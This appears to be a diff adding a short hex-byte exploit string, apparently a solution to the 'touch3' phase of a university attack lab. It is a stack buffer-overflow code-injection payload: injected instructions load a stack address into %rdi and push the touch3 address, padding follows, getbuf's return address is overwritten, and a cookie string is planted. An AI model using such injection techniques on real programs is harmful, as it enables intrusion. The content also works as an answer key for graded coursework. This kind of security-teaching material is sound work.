@@ -1,0 +1,8 @@
+48 c7 c7 a8 dc 61 55 68 /*movq test rsp, %rdi/
+fa 18 40 00 c3 00 00 00 /*push tourch3 addr*/
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 /*ret getbuf rsp*/
+35 39 62 39 39 37 66 61 /*test buf store cookie*/
+00
